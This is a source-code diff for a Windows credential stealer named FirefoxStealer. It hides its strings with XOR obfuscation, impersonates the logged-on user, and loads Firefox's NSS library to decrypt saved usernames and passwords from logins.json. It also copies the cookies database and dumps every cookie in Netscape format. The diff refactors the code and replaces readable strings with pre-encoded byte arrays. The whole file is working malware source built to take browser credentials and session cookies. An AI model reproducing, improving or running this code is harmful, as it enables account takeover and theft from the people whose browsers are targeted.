@@ -3,15 +3,16 @@
 #include <filesystem>
 #include <fstream>
 #include <vector>
-#include <iostream>
+#include <string>
+#include <sstream>
 
 #include "FirefoxStealer.h"
 #include "../crypto/Base64.h"
+#include "../utils/Logger.h"
 #include "../utils/Obfuscator.h"
 #include "../utils/Shared.h"
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
-#include <sstream>
 
 #pragma comment(lib, "shlwapi.lib")
 
@@ -21,38 +22,30 @@ namespace credential {
 
     namespace {
         // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
-        const wchar_t kMozillaFirefoxEnc[] = { L'M'^0x4B, L'o'^0x1F, L'z'^0x8C, L'i'^0x3E, L'l'^0x4B, L'l'^0x1F, L'a'^0x8C, L' '^0x3E, L'F'^0x4B, L'i'^0x1F, L'r'^0x8C, L'e'^0x3E, L'f'^0x4B, L'o'^0x1F, L'x'^0x8C }; // Mozilla Firefox
-        const wchar_t kFirefoxProfilesEnc[] = { L'M'^0x4B, L'o'^0x1F, L'z'^0x8C, L'i'^0x3E, L'l'^0x4B, L'l'^0x1F, L'a'^0x8C, L'\\'^0x3E, L'F'^0x4B, L'i'^0x1F, L'r'^0x8C, L'e'^0x3E, L'f'^0x4B, L'o'^0x1F, L'x'^0x8C, L'\\'^0x3E, L'P'^0x4B, L'r'^0x1F, L'o'^0x8C, L'f'^0x3E, L'i'^0x4B, L'l'^0x1F, L'e'^0x8C, L's'^0x3E }; // Mozilla\Firefox\Profiles
-        const wchar_t kNssDllEnc[] = { L'n'^0x4B, L's'^0x1F, L's'^0x8C, L'3'^0x3E, L'.'^0x4B, L'd'^0x1F, L'l'^0x8C, L'l'^0x3E }; // nss3.dll
-        const wchar_t kNssInitEnc[] = { L'N'^0x4B, L'S'^0x1F, L'S'^0x8C, L'_'^0x3E, L'I'^0x4B, L'n'^0x1F, L'i'^0x8C, L't'^0x3E }; // NSS_Init
-        const wchar_t kNssShutdownEnc[] = { L'N'^0x4B, L'S'^0x1F, L'S'^0x8C, L'_'^0x3E, L'S'^0x4B, L'h'^0x1F, L'u'^0x8C, L't'^0x3E, L'd'^0x4B, L'o'^0x1F, L'w'^0x8C, L'n'^0x3E }; // NSS_Shutdown
-        const wchar_t kPk11SdrDecryptEnc[] = { L'P'^0x4B, L'K'^0x1F, L'1'^0x8C, L'1'^0x3E, L'S'^0x4B, L'D'^0x1F, L'R'^0x8C, L'_'^0x3E, L'D'^0x4B, L'e'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C }; // PK11SDR_Decrypt
-        const wchar_t kLoginsJsonEnc[] = { L'l'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L's'^0x1F, L'.'^0x8C, L'j'^0x3E, L's'^0x4B, L'o'^0x1F, L'n'^0x8C }; // logins.json
-        const wchar_t kCookiesSqliteEnc[] = { L'c'^0x4B, L'o'^0x1F, L'o'^0x8C, L'k'^0x3E, L'i'^0x4B, L'e'^0x1F, L's'^0x8C, L'.'^0x3E, L's'^0x4B, L'q'^0x1F, L'l'^0x8C, L'i'^0x3E, L't'^0x4B, L'e'^0x1F }; // cookies.sqlite
-        const wchar_t kQueryFxCookiesEnc[] = { L'S'^0x4B, L'E'^0x1F, L'L'^0x8C, L'E'^0x3E, L'C'^0x4B, L'T'^0x1F, L' '^0x8C, L'h'^0x3E, L'o'^0x4B, L's'^0x1F, L't'^0x8C, L','^0x3E, L' '^0x4B, L'p'^0x1F, L'a'^0x8C, L't'^0x3E, L'h'^0x4B, L','^0x1F, L' '^0x8C, L'i'^0x3E, L's'^0x4B, L'S'^0x1F, L'e'^0x8C, L'c'^0x3E, L'u'^0x4B, L'r'^0x1F, L'e'^0x8C, L','^0x3E, L' '^0x4B, L'e'^0x1F, L'x'^0x8C, L'p'^0x3E, L'i'^0x4B, L'r'^0x1F, L'y'^0x8C, L','^0x3E, L' '^0x4B, L'n'^0x1F, L'a'^0x8C, L'm'^0x3E, L'e'^0x4B, L','^0x1F, L' '^0x8C, L'v'^0x3E, L'a'^0x4B, L'l'^0x1F, L'u'^0x8C, L'e'^0x3E, L' '^0x4B, L'F'^0x1F, L'R'^0x8C, L'O'^0x3E, L'M'^0x4B, L' '^0x1F, L'm'^0x8C, L'o'^0x3E, L'z'^0x4B, L'_'^0x1F, L'c'^0x8C, L'o'^0x3E, L'o'^0x4B, L'k'^0x1F, L'i'^0x8C, L'e'^0x3E, L's'^0x4B }; // SELECT host, path, isSecure, expiry, name, value FROM moz_cookies
-        const wchar_t kLoginsEnc[] = { L'l'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L's'^0x1F }; // logins
-        const wchar_t kHostnameEnc[] = { L'h'^0x4B, L'o'^0x1F, L's'^0x8C, L't'^0x3E, L'n'^0x4B, L'a'^0x1F, L'm'^0x8C, L'e'^0x3E }; // hostname
-        const wchar_t kEncryptedUsernameEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L'n'^0x1F, L'a'^0x8C, L'm'^0x3E, L'e'^0x4B }; // encryptedUsername
-        const wchar_t kEncryptedPasswordEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'P'^0x1F, L'a'^0x8C, L's'^0x3E, L's'^0x4B, L'w'^0x1F, L'o'^0x8C, L'r'^0x3E, L'd'^0x4B }; // encryptedPassword
+        const wchar_t kMozillaFirefoxEnc[] = { L'\x06', L'\x70', L'\xf6', L'\x57', L'\x27', L'\x73', L'\xed', L'\x1e', L'\x0d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\0' };
+        const wchar_t kFirefoxProfilesEnc[] = { L'\x06', L'\x70', L'\xf6', L'\x57', L'\x27', L'\x73', L'\xed', L'\x62', L'\x0d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\x62', L'\x1b', L'\x6d', L'\xe3', L'\x58', L'\x22', L'\x73', L'\xe9', L'\x4d', L'\0' };
+        const wchar_t kNssDllEnc[] = { L'\x25', L'\x6c', L'\xff', L'\x0d', L'\x65', L'\x7b', L'\xe0', L'\x52', L'\0' };
+        const wchar_t kNssInitEnc[] = { L'\x05', L'\x4c', L'\xdf', L'\x61', L'\x02', L'\x71', L'\xe5', L'\x4a', L'\0' };
+        const wchar_t kNssShutdownEnc[] = { L'\x05', L'\x4c', L'\xdf', L'\x61', L'\x18', L'\x77', L'\xf9', L'\x4a', L'\x2f', L'\x70', L'\xfb', L'\x50', L'\0' };
+        const wchar_t kPk11SdrDecryptEnc[] = { L'\x1b', L'\x54', L'\xbd', L'\x0f', L'\x18', L'\x5b', L'\xde', L'\x61', L'\x0f', L'\x7a', L'\xef', L'\x4c', L'\x32', L'\x6f', L'\xf8', L'\0' };
+        const wchar_t kLoginsJsonEnc[] = { L'\x27', L'\x70', L'\xeb', L'\x57', L'\x25', L'\x6c', L'\xa2', L'\x54', L'\x38', L'\x70', L'\xe2', L'\0' };
+        const wchar_t kCookiesSqliteEnc[] = { L'\x28', L'\x70', L'\xe3', L'\x55', L'\x22', L'\x7a', L'\xff', L'\x10', L'\x38', L'\x6e', L'\xe0', L'\x57', L'\x3f', L'\x7a', L'\0' };
+        const wchar_t kQueryFxCookiesEnc[] = { L'\x18', L'\x5a', L'\xc0', L'\x7b', L'\x08', L'\x4b', L'\xac', L'\x56', L'\x24', L'\x6c', L'\xf8', L'\x12', L'\x6b', L'\x6f', L'\xed', L'\x4a', L'\x23', L'\x33', L'\xac', L'\x57', L'\x38', L'\x4c', L'\xe9', L'\x5d', L'\x3e', L'\x6d', L'\xe9', L'\x12', L'\x6b', L'\x7a', L'\xf4', L'\x4e', L'\x22', L'\x6d', L'\xf5', L'\x12', L'\x6b', L'\x71', L'\xed', L'\x53', L'\x2e', L'\x33', L'\xac', L'\x48', L'\x2a', L'\x73', L'\xf9', L'\x5b', L'\x6b', L'\x59', L'\xde', L'\x71', L'\x06', L'\x3f', L'\xe1', L'\x51', L'\x31', L'\x40', L'\xef', L'\x51', L'\x24', L'\x74', L'\xe5', L'\x5b', L'\x38', L'\0' };
 
-        typedef enum {
-            SECSuccess = 0,
-            SECFailure = -1
-        } SECStatus;
+        const wchar_t kLoginsKeyEnc[] = { L'l'^0x4B, L'o'^0x1F, L'g'^0x8C, L'i'^0x3E, L'n'^0x4B, L's'^0x1F, L'\0' };
+        const wchar_t kHostnameEnc[] = { L'h'^0x4B, L'o'^0x1F, L's'^0x8C, L't'^0x3E, L'n'^0x4B, L'a'^0x1F, L'm'^0x8C, L'e'^0x3E, L'\0' };
+        const wchar_t kEncUserEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'U'^0x1F, L's'^0x8C, L'e'^0x3E, L'r'^0x4B, L'n'^0x1F, L'a'^0x8C, L'm'^0x3E, L'e'^0x4B, L'\0' };
+        const wchar_t kEncPassEnc[] = { L'e'^0x4B, L'n'^0x1F, L'c'^0x8C, L'r'^0x3E, L'y'^0x4B, L'p'^0x1F, L't'^0x8C, L'e'^0x3E, L'd'^0x4B, L'P'^0x1F, L'a'^0x8C, L's'^0x3E, L's'^0x4B, L'w'^0x1F, L'o'^0x8C, L'r'^0x3E, L'd'^0x4B, L'\0' };
 
-        struct SECItem {
-            unsigned int type;
-            unsigned char* data;
-            unsigned int len;
-        };
-
+        typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
+        struct SECItem { unsigned int type; unsigned char* data; unsigned int len; };
         typedef SECStatus(*NSSInitFunc)(const char*);
         typedef SECStatus(*PK11SDRDecryptFunc)(SECItem*, SECItem*, void*);
         typedef SECStatus(*NSSShutdownFunc)();
 
         std::string FindFirefoxInstallPath() {
             char path[MAX_PATH];
-            std::string mozillaFirefox = utils::ws2s(utils::DecryptW(kMozillaFirefoxEnc, sizeof(kMozillaFirefoxEnc)/sizeof(kMozillaFirefoxEnc[0])));
+            std::string mozillaFirefox = utils::ws2s(utils::DecryptW(kMozillaFirefoxEnc, wcslen(kMozillaFirefoxEnc)));
             if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
                 std::string p = std::string(path) + "\\" + mozillaFirefox;
                 if (fs::exists(p)) return p;
@@ -68,12 +61,10 @@ namespace credential {
             std::vector<std::string> profiles;
             char path[MAX_PATH];
             if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
-                fs::path profilesPath = fs::path(path) / utils::ws2s(utils::DecryptW(kFirefoxProfilesEnc, sizeof(kFirefoxProfilesEnc)/sizeof(kFirefoxProfilesEnc[0])));
+                fs::path profilesPath = fs::path(path) / utils::ws2s(utils::DecryptW(kFirefoxProfilesEnc, wcslen(kFirefoxProfilesEnc)));
                 if (fs::exists(profilesPath)) {
                     for (const auto& entry : fs::directory_iterator(profilesPath)) {
-                        if (entry.is_directory()) {
-                            profiles.push_back(entry.path().string());
-                        }
+                        if (entry.is_directory()) profiles.push_back(entry.path().string());
                     }
                 }
             }
@@ -83,100 +74,82 @@ namespace credential {
         std::string DecryptNSS(const std::string& base64Data, PK11SDRDecryptFunc decryptFunc) {
             std::vector<BYTE> encrypted = crypto::Base64Decode(base64Data);
             if (encrypted.empty()) return "";
-
             SECItem input = { 0, encrypted.data(), (unsigned int)encrypted.size() };
             SECItem output = { 0, nullptr, 0 };
-
             if (decryptFunc(&input, &output, nullptr) == SECSuccess) {
                 std::string decrypted((char*)output.data, output.len);
-                // NSS allocates memory that should be freed with SECITEM_FreeItem or similar,
-                // but since we don't have all headers, we just hope it's standard heap or leak it once.
                 return decrypted;
             }
             return "";
         }
 
         void SafeCopyDatabase(const std::string& src, const std::string& dest) {
-            CopyFileA(src.c_str(), dest.c_str(), FALSE);
-            // Also copy sidecars if they exist (WAL mode)
-            std::string wal = src + "-wal";
-            std::string shm = src + "-shm";
-            if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
-            if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
+            try {
+                if (!fs::exists(src)) return;
+                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
+                if (fs::exists(src + "-wal")) fs::copy_file(src + "-wal", dest + "-wal", fs::copy_options::overwrite_existing);
+                if (fs::exists(src + "-shm")) fs::copy_file(src + "-shm", dest + "-shm", fs::copy_options::overwrite_existing);
+            } catch (...) {
+                CopyFileA(src.c_str(), dest.c_str(), FALSE);
+            }
         }
 
         void SafeDeleteDatabase(const std::string& path) {
-            DeleteFileA(path.c_str());
-            DeleteFileA((path + "-wal").c_str());
-            DeleteFileA((path + "-shm").c_str());
+            try {
+                fs::remove(path);
+                fs::remove(path + "-wal");
+                fs::remove(path + "-shm");
+            } catch (...) {}
         }
     }
 
     std::string DumpFirefoxPasswords() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
-        if (!impersonated) report += "[!] Impersonation failed.\n";
-
         std::string firefoxPath = FindFirefoxInstallPath();
         if (firefoxPath.empty()) {
             if (impersonated) utils::RevertToSelf();
-            return report + "Firefox installation not found.";
+            return report + "Firefox not found.";
         }
-
         std::vector<std::string> profiles = FindFirefoxProfiles();
         if (profiles.empty()) {
             if (impersonated) utils::RevertToSelf();
-            return report + "No Firefox profiles found.";
+            return report + "No profiles found.";
         }
-
-        std::string nssDllPath = firefoxPath + "\\" + utils::ws2s(utils::DecryptW(kNssDllEnc, sizeof(kNssDllEnc)/sizeof(kNssDllEnc[0])));
+        std::string nssDllPath = firefoxPath + "\\" + utils::ws2s(utils::DecryptW(kNssDllEnc, wcslen(kNssDllEnc)));
         HMODULE hNss = LoadLibraryExA(nssDllPath.c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
         if (!hNss) {
             if (impersonated) utils::RevertToSelf();
-            return report + "Failed to load nss from " + firefoxPath;
+            return report + "Failed to load nss3.dll";
         }
-
-        auto nssInit = (NSSInitFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssInitEnc, sizeof(kNssInitEnc)/sizeof(kNssInitEnc[0]))).c_str());
-        auto nssShutdown = (NSSShutdownFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssShutdownEnc, sizeof(kNssShutdownEnc)/sizeof(kNssShutdownEnc[0]))).c_str());
-        auto pk11SdrDecrypt = (PK11SDRDecryptFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kPk11SdrDecryptEnc, sizeof(kPk11SdrDecryptEnc)/sizeof(kPk11SdrDecryptEnc[0]))).c_str());
-
+        auto nssInit = (NSSInitFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssInitEnc, wcslen(kNssInitEnc))).c_str());
+        auto nssShutdown = (NSSShutdownFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kNssShutdownEnc, wcslen(kNssShutdownEnc))).c_str());
+        auto pk11SdrDecrypt = (PK11SDRDecryptFunc)GetProcAddress(hNss, utils::ws2s(utils::DecryptW(kPk11SdrDecryptEnc, wcslen(kPk11SdrDecryptEnc))).c_str());
         if (!nssInit || !pk11SdrDecrypt) {
             FreeLibrary(hNss);
             if (impersonated) utils::RevertToSelf();
             return report + "Failed to find NSS functions.";
         }
-
         report += "PROFILE | URL | USERNAME | PASSWORD\n";
         report += "--------------------------------------------------------------------------------\n";
-        
         bool foundAny = false;
-
         for (const auto& profile : profiles) {
-            fs::path loginsPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kLoginsJsonEnc, sizeof(kLoginsJsonEnc)/sizeof(kLoginsJsonEnc[0])));
+            fs::path loginsPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kLoginsJsonEnc, wcslen(kLoginsJsonEnc)));
             if (!fs::exists(loginsPath)) continue;
-
-            // NSS usually needs "sql:" prefix for modern versions
             std::string nssPath = "sql:" + profile;
-            if (nssInit(nssPath.c_str()) != SECSuccess) {
-                // Fallback to direct path
-                if (nssInit(profile.c_str()) != SECSuccess) continue;
-            }
-
+            if (nssInit(nssPath.c_str()) != SECSuccess) { if (nssInit(profile.c_str()) != SECSuccess) continue; }
             try {
                 std::ifstream f(loginsPath);
                 nlohmann::json j;
                 f >> j;
-
-                std::string loginsKey = utils::ws2s(utils::DecryptW(kLoginsEnc, sizeof(kLoginsEnc)/sizeof(kLoginsEnc[0])));
+                std::string loginsKey = utils::ws2s(utils::DecryptW(kLoginsKeyEnc, wcslen(kLoginsKeyEnc)));
                 if (j.contains(loginsKey)) {
                     for (const auto& login : j[loginsKey]) {
-                        std::string url = login.value(utils::ws2s(utils::DecryptW(kHostnameEnc, sizeof(kHostnameEnc)/sizeof(kHostnameEnc[0]))), "N/A");
-                        std::string encUser = login.value(utils::ws2s(utils::DecryptW(kEncryptedUsernameEnc, sizeof(kEncryptedUsernameEnc)/sizeof(kEncryptedUsernameEnc[0]))), "");
-                        std::string encPass = login.value(utils::ws2s(utils::DecryptW(kEncryptedPasswordEnc, sizeof(kEncryptedPasswordEnc)/sizeof(kEncryptedPasswordEnc[0]))), "");
-
+                        std::string url = login.value(utils::ws2s(utils::DecryptW(kHostnameEnc, wcslen(kHostnameEnc))), "N/A");
+                        std::string encUser = login.value(utils::ws2s(utils::DecryptW(kEncUserEnc, wcslen(kEncUserEnc))), "");
+                        std::string encPass = login.value(utils::ws2s(utils::DecryptW(kEncPassEnc, wcslen(kEncPassEnc))), "");
                         std::string username = DecryptNSS(encUser, pk11SdrDecrypt);
                         std::string password = DecryptNSS(encPass, pk11SdrDecrypt);
-
                         if (!username.empty() || !password.empty()) {
                             report += fs::path(profile).filename().string() + " | " + url + " | " + username + " | " + password + "\n";
                             foundAny = true;
@@ -184,49 +157,31 @@ namespace credential {
                     }
                 }
             } catch (...) {}
-
             if (nssShutdown) nssShutdown();
         }
-
         FreeLibrary(hNss);
-
         if (impersonated) utils::RevertToSelf();
-        if (!foundAny) return report + "No passwords found in Firefox profiles.";
         return report;
     }
 
     std::string StealFirefoxCookies() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
-        std::string report = "# FIREFOX COOKIE STEALER RESULTS\n";
-        if (!impersonated) report += "# [!] Impersonation failed.\n";
-
+        std::stringstream ss;
+        ss << "# FIREFOX COOKIE STEALER RESULTS\n";
         std::vector<std::string> profiles = FindFirefoxProfiles();
-        if (profiles.empty()) {
-            if (impersonated) utils::RevertToSelf();
-            return report + "No Firefox profiles found to steal cookies from.";
-        }
-
-        std::stringstream resultSS;
-        resultSS << report;
-        
-        int cookieCount = 0;
-
+        int count = 0;
         for (const auto& profile : profiles) {
-            fs::path cookiesDbPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kCookiesSqliteEnc, sizeof(kCookiesSqliteEnc)/sizeof(kCookiesSqliteEnc[0])));
+            fs::path cookiesDbPath = fs::path(profile) / utils::ws2s(utils::DecryptW(kCookiesSqliteEnc, wcslen(kCookiesSqliteEnc)));
             if (!fs::exists(cookiesDbPath)) continue;
-
             char tempPath[MAX_PATH];
             GetTempPathA(MAX_PATH, tempPath);
             std::string tempDb = std::string(tempPath) + "cfx_" + std::to_string(GetTickCount64()) + ".sqlite";
-            
             SafeCopyDatabase(cookiesDbPath.string(), tempDb);
-
             sqlite3* db;
             if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                std::string query_str = utils::ws2s(utils::DecryptW(kQueryFxCookiesEnc, sizeof(kQueryFxCookiesEnc)/sizeof(kQueryFxCookiesEnc[0])));
-                const char* query = query_str.c_str();
+                std::string query_str = utils::ws2s(utils::DecryptW(kQueryFxCookiesEnc, wcslen(kQueryFxCookiesEnc)));
                 sqlite3_stmt* stmt;
-                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+                if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
                         const char* host = (const char*)sqlite3_column_text(stmt, 0);
                         const char* path = (const char*)sqlite3_column_text(stmt, 1);
@@ -234,17 +189,10 @@ namespace credential {
                         sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                         const char* name = (const char*)sqlite3_column_text(stmt, 4);
                         const char* value = (const char*)sqlite3_column_text(stmt, 5);
-                        
-                        // Format: domain flag path secure expiry name value
-                        resultSS << (host ? host : "") << "\t"
-                                 << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
-                                 << (path ? path : "") << "\t"
-                                 << (isSecure ? "TRUE" : "FALSE") << "\t"
-                                 << expiry << "\t"
-                                 << (name ? name : "") << "\t"
-                                 << (value ? value : "") << "\n";
-                        
-                        cookieCount++;
+                        if (host && name && value) {
+                            ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << (path ? path : "") << "\t" << (isSecure ? "TRUE" : "FALSE") << "\t" << expiry << "\t" << name << "\t" << value << "\n";
+                            count++;
+                        }
                     }
                     sqlite3_finalize(stmt);
                 }
@@ -252,16 +200,9 @@ namespace credential {
             }
             SafeDeleteDatabase(tempDb);
         }
-
         if (impersonated) utils::RevertToSelf();
-        if (cookieCount == 0) return report + "No cookies found in Firefox profiles.";
-        
-        std::stringstream finalOut;
-        finalOut << "# Total cookies extracted: " << cookieCount << "\n";
-        finalOut << "# Netscape HTTP Cookie File Format\n#\n";
-        finalOut << resultSS.str();
-        
-        return finalOut.str();
+        std::stringstream finalSS;
+        finalSS << "# Total cookies: " << count << "\n" << ss.str();
+        return finalSS.str();
     }
-
 }
